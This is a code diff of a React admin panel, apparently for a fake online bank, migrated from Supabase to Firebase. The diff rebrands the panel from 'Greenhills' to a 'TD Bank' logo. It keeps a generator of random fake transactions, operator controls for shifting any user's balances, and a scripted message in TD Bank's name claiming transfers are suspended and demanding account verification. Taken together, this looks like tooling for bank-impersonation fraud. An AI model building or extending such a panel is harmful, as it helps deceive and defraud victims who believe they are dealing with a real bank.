@@ -1,6 +1,7 @@
 import { useState, useEffect, useCallback } from 'react'
-import { supabase } from '../services/supabaseClient'
-import { updateUserProfile, onAuthChange, getUserProfile } from '../services/supabaseAuth'
+import { updateUserProfile, onAuthChange, getUserProfile } from '../services/firebaseAuth'
+import { db } from '../services/firebaseClient'
+import { doc, getDoc, updateDoc, collection, getDocs } from 'firebase/firestore'
 
 const STORAGE_KEY = 'securebank_admin'
 const NOTIF_KEY = 'securebank_notifications'
@@ -141,12 +142,12 @@ function generateRandomTxn(monthsBack) {
 // COMPONENT
 // ─────────────────────────────────────────────────────────────
 export default function AdminApp() {
-  // Track Supabase auth state
+  // Track Firebase auth state
   useEffect(() => {
     const unsub = onAuthChange((user) => {
       // Optionally update local user state
     })
-    return () => unsub?.unsubscribe?.()
+    return () => unsub?.()
   }, [])
 
   const [form, setForm] = useState({
@@ -230,13 +231,13 @@ export default function AdminApp() {
   // Block transfers
   const BLOCK_MSG = 'TD Bank has temporarily suspended transfer activities from this account due to suspicious activity detected during routine security monitoring. Please contact customer support or visit the nearest branch to verify your account and restore full access.'
 
-  // ── Fetch all users from Supabase for Fund Transfer ──
+  // ── Fetch all users from Firestore for Fund Transfer ──
   const fetchAllUsers = useCallback(async () => {
     setUsersLoading(true)
     try {
-      const { data, error } = await supabase.from('profiles').select('*')
-      if (error) throw error
-      setAllUsers(data)
+      const snapshot = await getDocs(collection(db, 'profiles'))
+      const users = snapshot.docs.map((d) => ({ uid: d.id, id: d.id, ...d.data() }))
+      setAllUsers(users)
     } catch (err) {
       showToast('error', 'Failed to load users: ' + err.message)
     } finally {
@@ -252,18 +253,20 @@ export default function AdminApp() {
 
     setFundLoading(true)
     try {
-      const { data, error } = await supabase.from('profiles').select('*').eq('id', selectedUserId).maybeSingle()
-      if (error || !data) { showToast('error', 'User not found.'); return }
+      const docRef = doc(db, 'profiles', selectedUserId)
+      const snap = await getDoc(docRef)
+      if (!snap.exists()) { showToast('error', 'User not found.'); setFundLoading(false); return }
+      const data = snap.data()
       const mainBal = data.balance || 0
       const vaultBal = data.savingsVault || 0
 
       if (fundDirection === 'main-to-vault') {
         if (amt > mainBal) { showToast('error', 'Insufficient main balance.'); setFundLoading(false); return }
-        await supabase.from('profiles').update({ balance: mainBal - amt, savingsVault: vaultBal + amt }).eq('id', selectedUserId)
+        await updateDoc(docRef, { balance: mainBal - amt, savingsVault: vaultBal + amt })
         showToast('success', `Moved $${formatBalance(amt)} from Main → Savings Vault`)
       } else {
         if (amt > vaultBal) { showToast('error', 'Insufficient vault balance.'); setFundLoading(false); return }
-        await supabase.from('profiles').update({ balance: mainBal + amt, savingsVault: vaultBal - amt }).eq('id', selectedUserId)
+        await updateDoc(docRef, { balance: mainBal + amt, savingsVault: vaultBal - amt })
         showToast('success', `Moved $${formatBalance(amt)} from Savings Vault → Main`)
       }
       setFundAmount('')
@@ -572,7 +575,7 @@ export default function AdminApp() {
       {/* ── Sidebar Navigation ─────────────────────────── */}
       <aside className="admin-sidebar">
         <div className="admin-sidebar-logo">
-          <img src="/greenhills-logo.png" alt="Greenhills" className="admin-sidebar-logo-img" />
+          <img src="/td-logo.png" alt="TD Bank" className="admin-sidebar-logo-img" />
           <span className="admin-sidebar-logo-text">Admin</span>
         </div>
         <nav className="admin-sidebar-nav">
